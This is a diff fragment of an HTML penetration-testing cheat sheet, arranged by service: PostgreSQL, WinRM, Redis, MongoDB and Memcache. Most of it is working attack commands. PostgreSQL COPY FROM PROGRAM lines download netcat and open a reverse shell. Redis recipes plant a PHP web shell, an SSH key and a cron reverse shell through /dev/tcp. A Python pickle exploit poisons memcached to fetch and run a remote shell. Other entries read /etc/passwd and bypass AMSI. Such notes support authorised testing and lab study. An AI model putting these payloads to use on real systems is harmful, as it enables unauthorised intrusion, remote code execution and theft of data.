-    def __reduce__(self):
-        cmd = ('wget http://{}:5000/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell'.format(sys.argv[1]))
-        return os.system, (cmd,)
-if __name__ == '__main__':
-    client = base.Client((sys.argv[2], 11211))
-    client.set(sys.argv[3], pickle.dumps(RCE()))
-</pre>
-    </ul>
-    <li>python exploit.py &lt;attacker ip&gt; &lt;memcache server ip&gt; &lt;session:&lt;value&gt;&gt;</li>
-    <ul>
-        <li>&lt;session:&lt;value&gt;&gt; comes from authenticated session cookie dumped from memcache server</li>
+        <li>Username: postgres</li>
+        <li>Password: postgres</li>
         <ul>
-            <li>This cookie can also stored in browser storage</li>
+            <li>Sometimes no password?</li>
         </ul>
     </ul>
-</ul>
+    <li>Typical reverse shell privileges</li>
+    <ul>
+        <li>NT AUTHORITY/NETWORK SERVICE (low priv)</li>
+        <li>Linux - postgres (low priv)</li>
+        <li>Mac - user that installed postgres (usually an admin)</li>
+    </ul>
+    <li>Tools</li>
+    <ul>
+        <li>psql</li>
+        <table>
+            <tr>
+                <td>connect to databse</td>
+                <td>psql -h &lt;ip address&gt; -U &lt;username&gt;</td>
+            </tr>
+            <tr>
+                <td>List databases</td>
+                <td>\list</td>
+            </tr>
+            <tr>
+                <td>use databases</td>
+                <td>\c &lt;db&gt;</td>
+            </tr>
+            <tr>
+                <td>List tables</td>
+                <td>\d</td>
+            </tr>
+            <tr>
+                <td>Get user roles</td>
+                <td>\du+</td>
+            </tr>
+            <tr>
+                <td>Browse system files</td>
+                <td>select pg_ls_dir('./');<br>select pg_ls_dir('/etc/passwd');</td>
+            </tr>
+            <tr>
+                <td>Read files by copying contents to a table</td>
+                <td>
+                    <table>
+                        <tr>
+                            <td>Create table</td>
+                            <td>create table docs (data TEXT);</td>
+                        </tr>
+                        <tr>
+                            <td>Copy contents to a table</td>
+                            <td>copy docs from '/etc/passwd';</td>
+                        </tr>
+                        <tr>
+                            <td>Display table contents</td>
+                            <td>select * from docs limit 10;</td>
+                        </tr>
+                    </table>
+                </td>
+            </tr>
+        </table>
+    </ul>
+    <li>RCE</li>
+    <table>
+        <tr>
+            <td>Drop table</td>
+            <td>DROP TABLE IF EXISTS cmd_exec;</td>
+        </tr>
+        <tr>
+            <td>Create table</td>
+            <td>CREATE TABLE cmd_exec(cmd_output text);</td>
+        </tr>
+        <tr>
+            <td>Setup command</td>
+            <td>COPY cmd_exec FROM PROGRAM 'id'<br>COPY cmd_exec FROM PROGRAM 'wget http://&lt;ip address&gt;/nc';<br>COPY cmd_exec FROM PROGRAM 'nc -n &lt;ip address&gt; &lt;rev shell port&gt; -e /usr/bin/bash';</td>
+        </tr>
+        <tr>
+            <td>Remove command</td>
+            <td>DELETE FROM cmd_exec;</td>
+        </tr>
+        <tr>
+            <td>Execute command</td>
+            <td>SELECT * FROM cmd_exec;</td>
+        </tr>
+    </table>
+
+    <h2>5985 TCP / Microsoft HTTPAPI</h2>
+    <br>
+
+    <h2>5985 TCP / WinRM</h2>
+    <li>Windows remote management</li>
+    <ul>
+        <li>Can log into a remote shell using user credentials</li>
+        <ul>
+            <li>Only users part of groups that have rights to this are allowed to login this way</li>
+        </ul>
+    </ul>
+    <li>Tools</li>
+    <ul>
+        <li>Evil-WinRM</li>
+        <ul>
+            <li>https://github.com/Hackplayers/evil-winrm</li>
+        </ul>
+        <table>
+            <tr>
+                <td>Usage</td>
+                <td>evil-winrm -I &lt;ip address&gt; -u &lt;username&gt; -p &lt;password&gt;</td>
+            </tr>
+            <tr>
+                <td>Show menu</td>
+                <td>menu</td>
+            </tr>
+            <tr>
+                <td>Invoke-Binary</td>
+                <td>Invoke-Binary &lt;.exe on local machine&gt;</td>
+            </tr>
+            <tr>
+                <td>Bypass AMSI</td>
+                <td>Bypass-4MSI</td>
+            </tr>
+            <tr>
+                <td>Connect with SSL cert</td>
+                <td>evil-winrm -i &lt;ip address&gt; -u &lt;user&gt; -p &lt;password&gt; -k &lt;private key&gt; -c &lt;signed key/certificate&gt; -S</td>
+            </tr>
+        </table>
+    </ul>
+
+    <h2>6379 TCP / redis</h2>
+    <li>Key store / value storage</li>
+    <li>RCE Methods:</li>
+    <ul>
+        <li>Create php web shell</li>
+        <li>If able to upload files (not using redis) to victim, upload module for RCE</li>
+        <li>=&lt;5.0.5(?) clone-master RCE</li>
+        <li>Create SSH key on victim</li>
+        <li>Create malicious cronjob</li>
+    </ul>
+    <li>Tools</li>
+    <ul>
+        <li>redis-cli</li>
+        <table>
+            <tr>
+                <td>
+                    <li>Get redis info / test if authentication is require</li>
+                    <ul>
+                        <li>By default redis does not require credentials</li>
+                        <li>Redis can be configured to require only a password or username + password</li>
+                        <ul>
+                            <li>If only the passsword is set, then the username is "default"</li>
+                            <li>There is no way to know externally if password or password & username are set.</li>
+                            <li>redis.conf is the configuration file.  requirepass and masteruser are the username and password settings</li>
+                        </ul>
+                    </ul>
+                </td>
+                <td>info</td>
+            </tr>
+            <tr>
+                <td>Login with credentials</td>
+                <td>AUTH &lt;password&gt;<br>AUTH &lt;username&gt; &lt;password&gt;</td>
+            </tr>
+            <tr>
+                <td>Get configuration file contents</td>
+                <td>CONFIG GET *</td>
+            </tr>
+            <tr>
+                <td>Show connected clients</td>
+                <td>CLIENT LIST</td>
+            </tr>
+            <tr>
+                <td>Show keys</td>
+                <td>keys *</td>
+            </tr>
+            <tr>
+                <td>Get keys from database</td>
+                <td>SELECT &lt;db # under &quot;# Keyspace&quot; in info&gt;&lt;br&gt;KEYS *&lt;br&gt;GET &lt;Key&gt;</td>
+            </tr>
+            <tr>
+                <td>Web shell RCE</td>
+                <td>config set dir &lt;web server root directory&gt;<br>config set dbfilename shell.php<br>set test "<?php system($_REQUEST['cmd'] ?>"<br>save</td>
+            </tr>
+            <tr>
+                <td>Upload SSH Key</td>
+                <td>import public key to redis:<br>(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt<br>cat foo.txt | redis-cli -h &lt;ip addres&gt; -x set crackit<br>config set dir &lt;writable home directory&gt;<br>config set dbfilename<br>"authorized_keys"<br>save</td>
+            </tr>
+            <tr>
+                <td>Reverse shell through cronjobs</td>
+                <td>
+                    <li>redis-cli -h &lt;ip address&gt; flushall </li>
+                    <li>echo -e "\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/&lt;ip address&gt;/&lt;port&gt; 0&gt;&amp;1\n\n&quot;|redis-cli -h &lt;ip address&gt; -x set 1</li>
+                    <li>redis-cli -h &lt;ip address&gt; config set dir /var/spool/cron/ </li>
+                    <li>redis-cli -h &lt;ip address&gt; config set dbfilename root</li>
+                    <li>redis-cli -h &lt;ip address&gt; save</li>
+                </td>
+            </tr>
+        </table>
+    </ul>
+
+    <h2>6697 TCP / irc</h2>
+    <li>Incoming IRC connections encrypted via TLS/SSL</li>
+
+    <br>
+
+    <h2>27017 TCP / mongodb</h2>
+    <table>
+        <tr>
+            <td>Connect to db</td>
+            <td>mongo -u &lt;username&gt; -p &lt;password&gt; &lt;database&gt;</td>
+        </tr>
+        <tr>
+            <td>show collections (mongodb version of mysql tables)</td>
+            <td>show collections</td>
+        </tr>
+        <tr>
+            <td>search for objects in a collection</td>
+            <td>db.&lt;collection&gt;.find()</td>
+        </tr>
+        <tr>
+            <td>add command/object to collection</td>
+            <td>db.tasks.insert({"cmd&quot;:&quot;&lt;bash command&gt;&quot;})</td>
+        </tr>
+    </table>
+
+    <h2>11211 TCP / memcache</h2>
+    <li>Tools</li>
+    <ul>
+        <li>nc</li>
+        <li>telnet</li>
+    </ul>
+    <li>memcache commands</li>
+    <table>
+        <tr>
+            <td>Retrieve cached items list</td>
+            <td>stats items</td>
+        </tr>
+        <tr>
+            <td>
+                <li>View cachedump of key retrieved from "stats items"</li>
+                <ul>
+                    <li>STAT items:&lt;#&gt;:age 75, etc</li>
+                    <li>0 at the end for dumping unlimited lines</li>
+                </ul>
+            </td>
+            <td>stats cachedump &lt;#&gt; 0</td>
+        </tr>
+    </table>
+
+    <li>RCE -python pickling</li>
+    <ul>
+        <li>pip install pymemcache</li>
+        <li>Generate malicious pickled python object to poison memcached object</li>
+        <ul>
+            <li>Script:</li>
+            <pre>
+                import pickle
+                import os
+                import sys
+                from pymemcache.client import base
+                class RCE:
+                def __reduce__(self):
+                cmd = ('wget http://{}:5000/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell'.format(sys.argv[1]))
+                return os.system, (cmd,)
+                if __name__ == '__main__':
+                client = base.Client((sys.argv[2], 11211))
+                client.set(sys.argv[3], pickle.dumps(RCE()))
+            </pre>
+        </ul>
+        <li>python exploit.py &lt;attacker ip&gt; &lt;memcache server ip&gt; &lt;session:&lt;value&gt;&gt;</li>
+        <ul>
+            <li>&lt;session:&lt;value&gt;&gt; comes from authenticated session cookie dumped from memcache server</li>
+            <ul>
+                <li>This cookie can also stored in browser storage</li>
+            </ul>
+        </ul>
+    </ul>
 
 </body>
 </html>
